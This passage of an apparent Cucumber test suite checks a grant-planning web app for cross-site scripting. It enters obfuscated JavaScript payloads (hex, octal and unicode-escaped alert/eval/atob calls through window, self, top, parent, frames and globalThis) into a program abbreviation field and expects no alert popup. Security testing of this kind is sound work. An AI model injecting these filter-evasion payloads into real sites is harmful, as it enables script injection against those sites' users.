      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301659 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                       | Field                |
      | ';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301660 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                               | Field                |
      | ';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301661 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301663 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | ';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301664 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                           | Field                |
      | ';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301666 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                        | Field                |
      | ';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301667 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301669 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | ';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301670 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                             | Field                |
      | ';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301671 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';window['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301672 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | ';self['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301675 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | ';this['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301678 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | ';top['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301679 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';parent['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301681 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | ';frames['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301684 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | ';globalThis['\141\154\145\162\164']('\130\123\123');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301685 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | ';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301687 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
